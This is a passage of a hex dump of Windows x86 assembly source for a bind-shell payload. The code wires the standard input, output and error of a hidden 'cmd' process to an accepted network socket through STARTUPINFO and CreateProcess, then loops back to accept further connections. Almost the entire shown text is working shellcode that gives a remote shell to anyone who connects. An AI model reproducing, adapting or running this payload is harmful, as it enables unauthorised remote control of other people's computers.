00002540  72 75 63 74 75 72 65 73  20 6f 6e 20 74 68 65 20  |ructures on the |
00002550  73 74 61 63 6b 20 66 6f  72 20 43 72 65 61 74 65  |stack for Create|
00002560  50 72 6f 63 65 73 73 41  0d 0a 3b 20 53 54 41 52  |ProcessA..; STAR|
00002570  54 55 50 49 4e 46 4f 20  7b 0d 0a 3b 20 20 20 44  |TUPINFO {..;   D|
00002580  57 4f 52 44 20 63 62 20  20 20 20 20 20 20 20 20  |WORD cb         |
00002590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000025a0  20 20 20 30 30 2d 30 33  3a 20 3e 3d 20 73 69 7a  |   00-03: >= siz|
000025b0  65 6f 66 28 53 54 41 52  54 55 50 49 4e 46 4f 29  |eof(STARTUPINFO)|
000025c0  0d 0a 3b 20 20 20 4c 50  54 53 54 52 20 6c 70 52  |..;   LPTSTR lpR|
000025d0  65 73 65 72 76 65 64 20  20 20 20 20 20 20 20 20  |eserved         |
000025e0  20 20 20 20 20 20 20 20  20 20 30 34 2d 30 37 3a  |          04-07:|
000025f0  20 30 0d 0a 3b 20 20 20  4c 50 54 53 54 52 20 6c  | 0..;   LPTSTR l|
00002600  70 44 65 73 6b 74 6f 70  20 20 20 20 20 20 20 20  |pDesktop        |
00002610  20 20 20 20 20 20 20 20  20 20 20 20 30 38 2d 30  |            08-0|
00002620  42 3a 20 30 0d 0a 3b 20  20 20 4c 50 54 53 54 52  |B: 0..;   LPTSTR|
00002630  20 6c 70 54 69 74 6c 65  20 20 20 20 20 20 20 20  | lpTitle        |
00002640  20 20 20 20 20 20 20 20  20 20 20 20 20 20 30 43  |              0C|
00002650  2d 30 46 3a 20 30 0d 0a  3b 20 20 20 44 57 4f 52  |-0F: 0..;   DWOR|
00002660  44 20 64 77 58 20 20 20  20 20 20 20 20 20 20 20  |D dwX           |
00002670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002680  31 30 2d 31 33 3a 20 30  0d 0a 3b 20 20 20 44 57  |10-13: 0..;   DW|
00002690  4f 52 44 20 64 77 59 20  20 20 20 20 20 20 20 20  |ORD dwY         |
000026a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000026b0  20 20 31 34 2d 31 37 3a  20 30 0d 0a 3b 20 20 20  |  14-17: 0..;   |
000026c0  44 57 4f 52 44 20 64 77  58 53 69 7a 65 20 20 20  |DWORD dwXSize   |
000026d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000026e0  20 20 20 20 31 38 2d 31  42 3a 20 30 0d 0a 3b 20  |    18-1B: 0..; |
000026f0  20 20 44 57 4f 52 44 20  64 77 59 53 69 7a 65 20  |  DWORD dwYSize |
00002700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002710  20 20 20 20 20 20 31 43  2d 31 46 3a 20 30 0d 0a  |      1C-1F: 0..|
00002720  3b 20 20 20 44 57 4f 52  44 20 64 77 58 43 6f 75  |;   DWORD dwXCou|
00002730  6e 74 43 68 61 72 73 20  20 20 20 20 20 20 20 20  |ntChars         |
00002740  20 20 20 20 20 20 20 20  32 30 2d 32 33 3a 20 30  |        20-23: 0|
00002750  0d 0a 3b 20 20 20 44 57  4f 52 44 20 64 77 59 43  |..;   DWORD dwYC|
00002760  6f 75 6e 74 43 68 61 72  73 20 20 20 20 20 20 20  |ountChars       |
00002770  20 20 20 20 20 20 20 20  20 20 32 34 2d 32 37 3a  |          24-27:|
00002780  20 30 0d 0a 3b 20 20 20  44 57 4f 52 44 20 64 77  | 0..;   DWORD dw|
00002790  46 69 6c 6c 41 74 74 72  69 62 75 74 65 20 20 20  |FillAttribute   |
000027a0  20 20 20 20 20 20 20 20  20 20 20 20 32 38 2d 32  |            28-2|
000027b0  42 3a 20 30 0d 0a 3b 20  20 20 44 57 4f 52 44 20  |B: 0..;   DWORD |
000027c0  64 77 46 6c 61 67 73 20  20 20 20 20 20 20 20 20  |dwFlags         |
000027d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 32 43  |              2C|
000027e0  2d 32 46 3a 20 28 53 54  41 52 54 46 5f 55 53 45  |-2F: (STARTF_USE|
000027f0  53 54 44 5f 48 41 4e 44  4c 45 53 20 30 78 31 30  |STD_HANDLES 0x10|
00002800  30 29 0d 0a 3b 20 20 20  57 4f 52 44 20 77 53 68  |0)..;   WORD wSh|
00002810  6f 77 57 69 6e 64 6f 77  20 20 20 20 20 20 20 20  |owWindow        |
00002820  20 20 20 20 20 20 20 20  20 20 20 20 33 30 2d 33  |            30-3|
00002830  31 3a 20 30 0d 0a 3b 20  20 20 57 4f 52 44 20 63  |1: 0..;   WORD c|
00002840  62 52 65 73 65 72 76 65  64 32 20 20 20 20 20 20  |bReserved2      |
00002850  20 20 20 20 20 20 20 20  20 20 20 20 20 20 33 32  |              32|
00002860  2d 33 33 3a 20 30 0d 0a  3b 20 20 20 4c 50 42 59  |-33: 0..;   LPBY|
00002870  54 45 20 6c 70 52 65 73  65 72 76 65 64 32 20 20  |TE lpReserved2  |
00002880  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002890  33 34 2d 33 37 3a 20 30  0d 0a 3b 20 20 20 48 41  |34-37: 0..;   HA|
000028a0  4e 44 4c 45 20 68 53 74  64 49 6e 70 75 74 20 20  |NDLE hStdInput  |
000028b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000028c0  20 20 33 38 2d 33 42 3a  20 28 53 6f 63 6b 65 74  |  38-3B: (Socket|
000028d0  20 64 65 73 63 72 69 70  74 6f 72 29 0d 0a 3b 20  | descriptor)..; |
000028e0  20 20 48 41 4e 44 4c 45  20 68 53 74 64 4f 75 74  |  HANDLE hStdOut|
000028f0  70 75 74 20 20 20 20 20  20 20 20 20 20 20 20 20  |put             |
00002900  20 20 20 20 20 20 33 43  2d 33 46 3a 20 28 53 6f  |      3C-3F: (So|
00002910  63 6b 65 74 20 64 65 73  63 72 69 70 74 6f 72 29  |cket descriptor)|
00002920  0d 0a 3b 20 20 20 48 41  4e 44 4c 45 20 68 53 74  |..;   HANDLE hSt|
00002930  64 45 72 72 6f 72 20 20  20 20 20 20 20 20 20 20  |dError          |
00002940  20 20 20 20 20 20 20 20  20 20 34 30 2d 34 33 3a  |          40-43:|
00002950  20 28 53 6f 63 6b 65 74  20 64 65 73 63 72 69 70  | (Socket descrip|
00002960  74 6f 72 29 0d 0a 3b 20  7d 0d 0a 73 69 7a 65 6f  |tor)..; }..sizeo|
00002970  66 5f 53 54 41 52 54 55  50 49 4e 46 4f 20 20 20  |f_STARTUPINFO   |
00002980  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002990  20 20 20 65 71 75 20 30  78 34 34 0d 0a 6f 66 66  |   equ 0x44..off|
000029a0  73 65 74 5f 64 77 46 6c  61 67 73 5f 69 6e 5f 53  |set_dwFlags_in_S|
000029b0  54 41 52 54 55 50 49 4e  46 4f 20 20 20 20 20 20  |TARTUPINFO      |
000029c0  20 20 20 20 20 65 71 75  20 30 78 32 43 0d 0a 6f  |     equ 0x2C..o|
000029d0  66 66 73 65 74 5f 68 53  74 64 49 6e 70 75 74 5f  |ffset_hStdInput_|
000029e0  69 6e 5f 53 54 41 52 54  55 50 49 4e 46 4f 20 20  |in_STARTUPINFO  |
000029f0  20 20 20 20 20 20 20 65  71 75 20 30 78 33 38 0d  |       equ 0x38.|
00002a00  0a 3b 20 45 61 63 68 20  63 61 6c 6c 20 74 6f 20  |.; Each call to |
00002a10  61 63 63 65 70 74 28 29  20 72 65 6d 6f 76 65 73  |accept() removes|
00002a20  20 74 77 6f 20 44 57 4f  52 44 53 20 6f 66 66 20  | two DWORDS off |
00002a30  74 68 65 20 73 74 61 63  6b 2e 20 54 68 65 73 65  |the stack. These|
00002a40  20 6d 75 73 74 20 62 65  20 70 75 74 20 62 61 63  | must be put bac|
00002a50  6b 0d 0a 3b 20 6f 72 20  45 53 50 20 77 69 6c 6c  |k..; or ESP will|
00002a60  20 72 75 6e 20 6f 66 66  20 74 68 65 20 73 74 61  | run off the sta|
00002a70  63 6b 20 65 76 65 6e 74  75 61 6c 6c 79 3a 0d 0a  |ck eventually:..|
00002a80  20 20 20 20 58 4f 52 20  20 20 20 20 45 44 58 2c  |    XOR     EDX,|
00002a90  20 45 44 58 20 20 20 20  20 20 20 20 20 20 20 20  | EDX            |
00002aa0  20 20 20 20 20 20 20 20  3b 20 45 44 58 20 3d 20  |        ; EDX = |
00002ab0  30 0d 0a 20 20 20 20 50  55 53 48 20 20 20 20 45  |0..    PUSH    E|
00002ac0  44 58 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |DX              |
00002ad0  20 20 20 20 20 20 20 20  20 20 20 3b 20 52 65 73  |           ; Res|
00002ae0  74 6f 72 65 20 73 74 61  63 6b 20 23 31 0d 0a 3b  |tore stack #1..;|
00002af0  20 57 65 27 6c 6c 20 61  6c 73 6f 20 63 72 65 61  | We'll also crea|
00002b00  74 65 20 61 20 73 74 72  75 63 74 20 53 54 41 52  |te a struct STAR|
00002b10  54 55 50 49 4e 46 4f 0d  0a 20 20 20 20 50 55 53  |TUPINFO..    PUS|
00002b20  48 20 20 20 20 42 32 44  57 28 27 63 27 2c 20 27  |H    B2DW('c', '|
00002b30  6d 27 2c 20 27 64 27 2c  20 27 20 27 29 20 20 20  |m', 'd', ' ')   |
00002b40  20 3b 20 52 65 73 74 6f  72 65 20 73 74 61 63 6b  | ; Restore stack|
00002b50  20 23 32 20 61 6e 64 20  53 54 41 52 54 55 50 49  | #2 and STARTUPI|
00002b60  4e 46 4f 2e 63 62 20 3d  20 22 63 6d 64 20 22 20  |NFO.cb = "cmd " |
00002b70  28 3e 20 30 29 0d 0a 20  20 20 20 4c 45 41 20 20  |(> 0)..    LEA  |
00002b80  20 20 20 45 44 49 2c 20  5b 45 53 50 20 2b 20 6f  |   EDI, [ESP + o|
00002b90  66 66 73 65 74 5f 68 53  74 64 49 6e 70 75 74 5f  |ffset_hStdInput_|
00002ba0  69 6e 5f 53 54 41 52 54  55 50 49 4e 46 4f 5d 3b  |in_STARTUPINFO];|
00002bb0  20 45 44 49 20 3d 20 26  28 53 54 41 52 54 55 50  | EDI = &(STARTUP|
00002bc0  49 4e 46 4f 2e 68 53 74  64 49 6e 70 75 74 29 0d  |INFO.hStdInput).|
00002bd0  0a 20 20 20 20 53 54 4f  53 44 20 20 20 20 20 20  |.    STOSD      |
00002be0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002bf0  20 20 20 20 20 20 20 20  20 3b 20 53 54 41 52 54  |         ; START|
00002c00  55 50 49 4e 46 4f 2e 68  53 74 64 49 6e 70 75 74  |UPINFO.hStdInput|
00002c10  20 3d 20 53 6f 63 6b 65  74 20 64 65 73 63 72 69  | = Socket descri|
00002c20  70 74 6f 72 0d 0a 20 20  20 20 53 54 4f 53 44 20  |ptor..    STOSD |
00002c30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002c40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00002c50  53 54 41 52 54 55 50 49  4e 46 4f 2e 68 53 74 64  |STARTUPINFO.hStd|
00002c60  4f 75 74 70 75 74 20 3d  20 53 6f 63 6b 65 74 20  |Output = Socket |
00002c70  64 65 73 63 72 69 70 74  6f 72 0d 0a 20 20 20 20  |descriptor..    |
00002c80  53 54 4f 53 44 20 20 20  20 20 20 20 20 20 20 20  |STOSD           |
00002c90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002ca0  20 20 20 20 3b 20 53 54  41 52 54 55 50 49 4e 46  |    ; STARTUPINF|
00002cb0  4f 2e 68 53 74 64 45 72  72 6f 72 20 3d 20 53 6f  |O.hStdError = So|
00002cc0  63 6b 65 74 20 64 65 73  63 72 69 70 74 6f 72 0d  |cket descriptor.|
00002cd0  0a 20 20 20 20 4d 4f 56  20 20 20 20 20 42 59 54  |.    MOV     BYT|
00002ce0  45 20 5b 45 44 49 20 2d  20 73 69 7a 65 6f 66 5f  |E [EDI - sizeof_|
00002cf0  53 54 41 52 54 55 50 49  4e 46 4f 20 2b 20 6f 66  |STARTUPINFO + of|
00002d00  66 73 65 74 5f 64 77 46  6c 61 67 73 5f 69 6e 5f  |fset_dwFlags_in_|
00002d10  53 54 41 52 54 55 50 49  4e 46 4f 20 2b 20 31 5d  |STARTUPINFO + 1]|
00002d20  2c 20 31 20 3b 20 53 54  41 52 54 55 50 49 4e 46  |, 1 ; STARTUPINF|
00002d30  4f 2e 64 77 46 6c 61 67  73 20 3d 20 53 54 41 52  |O.dwFlags = STAR|
00002d40  54 46 5f 55 53 45 53 54  44 48 41 4e 44 4c 45 53  |TF_USESTDHANDLES|
00002d50  20 28 30 78 31 30 30 29  0d 0a 3b 20 43 72 65 61  | (0x100)..; Crea|
00002d60  74 65 50 72 6f 63 65 73  73 28 2e 2e 2e 29 0d 0a  |teProcess(...)..|
00002d70  20 20 20 20 50 55 53 48  20 20 20 20 45 53 50 20  |    PUSH    ESP |
00002d80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002d90  20 20 20 20 20 20 20 20  3b 20 5f 5f 6f 75 74 20  |        ; __out |
00002da0  4c 50 50 52 4f 43 45 53  53 5f 49 4e 46 4f 52 4d  |LPPROCESS_INFORM|
00002db0  41 54 49 4f 4e 20 6c 70  50 72 6f 63 65 73 73 49  |ATION lpProcessI|
00002dc0  6e 66 6f 72 6d 61 74 69  6f 6e 20 3d 3d 20 26 28  |nformation == &(|
00002dd0  53 54 41 52 54 55 50 49  4e 46 4f 29 0d 0a 20 20  |STARTUPINFO)..  |
00002de0  20 20 58 43 48 47 20 20  20 20 5b 45 53 50 5d 2c  |  XCHG    [ESP],|
00002df0  20 45 44 49 20 20 20 20  20 20 20 20 20 20 20 20  | EDI            |
00002e00  20 20 20 20 20 20 3b 20  5f 5f 6f 75 74 20 4c 50  |      ; __out LP|
00002e10  50 52 4f 43 45 53 53 5f  49 4e 46 4f 52 4d 41 54  |PROCESS_INFORMAT|
00002e20  49 4f 4e 20 6c 70 50 72  6f 63 65 73 73 49 6e 66  |ION lpProcessInf|
00002e30  6f 72 6d 61 74 69 6f 6e  20 3d 3d 20 26 28 53 54  |ormation == &(ST|
00002e40  41 52 54 55 50 49 4e 46  4f 29 20 2b 20 73 69 7a  |ARTUPINFO) + siz|
00002e50  65 6f 66 28 53 54 41 52  54 55 50 49 4e 46 4f 29  |eof(STARTUPINFO)|
00002e60  0d 0a 20 20 20 20 50 55  53 48 20 20 20 20 45 44  |..    PUSH    ED|
00002e70  49 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |I               |
00002e80  20 20 20 20 20 20 20 20  20 20 3b 20 5f 5f 69 6e  |          ; __in|
00002e90  20 4c 50 53 54 41 52 54  55 50 49 4e 46 4f 20 6c  | LPSTARTUPINFO l|
00002ea0  70 53 74 61 72 74 75 70  49 6e 66 6f 20 3d 3d 20  |pStartupInfo == |
00002eb0  26 28 53 54 41 52 54 55  50 49 4e 46 4f 29 0d 0a  |&(STARTUPINFO)..|
00002ec0  20 20 20 20 50 55 53 48  20 20 20 20 45 44 58 20  |    PUSH    EDX |
00002ed0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002ee0  20 20 20 20 20 20 20 20  3b 20 5f 5f 69 6e 5f 6f  |        ; __in_o|
00002ef0  70 74 20 4c 50 43 54 53  54 52 20 6c 70 43 75 72  |pt LPCTSTR lpCur|
00002f00  72 65 6e 74 44 69 72 65  63 74 6f 72 79 20 3d 20  |rentDirectory = |
00002f10  4e 55 4c 4c 0d 0a 20 20  20 20 50 55 53 48 20 20  |NULL..    PUSH  |
00002f20  20 20 45 44 58 20 20 20  20 20 20 20 20 20 20 20  |  EDX           |
00002f30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00002f40  5f 5f 69 6e 5f 6f 70 74  20 4c 50 56 4f 49 44 20  |__in_opt LPVOID |
00002f50  6c 70 45 6e 76 69 72 6f  6e 6d 65 6e 74 20 3d 20  |lpEnvironment = |
00002f60  4e 55 4c 4c 0d 0a 20 20  20 20 50 55 53 48 20 20  |NULL..    PUSH  |
00002f70  20 20 45 44 58 20 20 20  20 20 20 20 20 20 20 20  |  EDX           |
00002f80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00002f90  5f 5f 69 6e 20 44 57 4f  52 44 20 64 77 43 72 65  |__in DWORD dwCre|
00002fa0  61 74 69 6f 6e 46 6c 61  67 73 20 3d 20 30 0d 0a  |ationFlags = 0..|
00002fb0  20 20 20 20 4d 4f 56 20  20 20 20 20 42 59 54 45  |    MOV     BYTE|
00002fc0  20 5b 45 44 49 2d 35 2a  34 2b 33 5d 2c 20 30 78  | [EDI-5*4+3], 0x|
00002fd0  38 20 20 20 20 20 20 20  3b 20 5f 5f 69 6e 20 44  |8       ; __in D|
00002fe0  57 4f 52 44 20 64 77 43  72 65 61 74 69 6f 6e 46  |WORD dwCreationF|
00002ff0  6c 61 67 73 20 3d 20 43  52 45 41 54 45 5f 4e 4f  |lags = CREATE_NO|
00003000  5f 57 49 4e 44 4f 57 20  28 30 78 30 38 30 30 30  |_WINDOW (0x08000|
00003010  30 30 30 29 0d 0a 20 20  20 20 50 55 53 48 20 20  |000)..    PUSH  |
00003020  20 20 45 44 49 20 20 20  20 20 20 20 20 20 20 20  |  EDI           |
00003030  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00003040  5f 5f 69 6e 20 42 4f 4f  4c 20 62 49 6e 68 65 72  |__in BOOL bInher|
00003050  69 74 48 61 6e 64 6c 65  73 20 3d 20 54 52 55 45  |itHandles = TRUE|
00003060  20 28 3e 30 29 0d 0a 20  20 20 20 50 55 53 48 20  | (>0)..    PUSH |
00003070  20 20 20 45 44 58 20 20  20 20 20 20 20 20 20 20  |   EDX          |
00003080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00003090  20 5f 5f 69 6e 5f 6f 70  74 20 4c 50 53 45 43 55  | __in_opt LPSECU|
000030a0  52 49 54 59 5f 41 54 54  52 49 42 55 54 45 53 20  |RITY_ATTRIBUTES |
000030b0  6c 70 54 68 72 65 61 64  41 74 74 72 69 62 75 74  |lpThreadAttribut|
000030c0  65 73 20 3d 20 4e 55 4c  4c 0d 0a 20 20 20 20 50  |es = NULL..    P|
000030d0  55 53 48 20 20 20 20 45  44 58 20 20 20 20 20 20  |USH    EDX      |
000030e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000030f0  20 20 20 3b 20 5f 5f 69  6e 5f 6f 70 74 20 4c 50  |   ; __in_opt LP|
00003100  53 45 43 55 52 49 54 59  5f 41 54 54 52 49 42 55  |SECURITY_ATTRIBU|
00003110  54 45 53 20 6c 70 50 72  6f 63 65 73 73 41 74 74  |TES lpProcessAtt|
00003120  72 69 62 75 74 65 73 20  3d 20 4e 55 4c 4c 0d 0a  |ributes = NULL..|
00003130  20 20 20 20 50 55 53 48  20 20 20 20 45 44 49 20  |    PUSH    EDI |
00003140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00003150  20 20 20 20 20 20 20 20  3b 20 5f 5f 69 6e 6f 75  |        ; __inou|
00003160  74 5f 6f 70 74 20 4c 50  54 53 54 52 20 6c 70 43  |t_opt LPTSTR lpC|
00003170  6f 6d 6d 61 6e 64 4c 69  6e 65 20 3d 20 26 28 22  |ommandLine = &("|
00003180  63 6d 64 20 22 29 0d 0a  20 20 20 20 50 55 53 48  |cmd ")..    PUSH|
00003190  20 20 20 20 45 44 58 20  20 20 20 20 20 20 20 20  |    EDX         |
000031a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000031b0  3b 20 5f 5f 69 6e 5f 6f  70 74 20 4c 50 43 54 53  |; __in_opt LPCTS|
000031c0  54 52 20 6c 70 41 70 70  6c 69 63 61 74 69 6f 6e  |TR lpApplication|
000031d0  4e 61 6d 65 20 3d 20 4e  55 4c 4c 0d 0a 20 20 20  |Name = NULL..   |
000031e0  20 43 41 4c 4c 20 20 20  20 5b 45 53 49 20 2d 20  | CALL    [ESI - |
000031f0  73 69 7a 65 6f 66 5f 70  72 6f 63 5f 61 64 64 72  |sizeof_proc_addr|
00003200  65 73 73 5f 74 61 62 6c  65 5d 0d 0a 3b 20 4c 6f  |ess_table]..; Lo|
00003210  61 64 20 61 63 63 65 70  74 28 29 20 69 6e 74 6f  |ad accept() into|
00003220  20 45 41 58 20 61 6e 64  20 6a 75 6d 70 20 62 61  | EAX and jump ba|
00003230  63 6b 20 69 6e 74 6f 20  6f 75 72 20 63 6f 64 65  |ck into our code|
00003240  2e 0d 0a 20 20 20 20 4d  4f 56 20 20 20 20 20 45  |...    MOV     E|
00003250  41 58 2c 20 5b 45 53 49  20 2d 20 34 5d 0d 0a 20  |AX, [ESI - 4].. |
00003260  20 20 20 4a 4d 50 20 20  20 20 20 61 63 63 65 70  |   JMP     accep|
00003270  74 5f 6c 6f 6f 70                                 |t_loop|
00003276
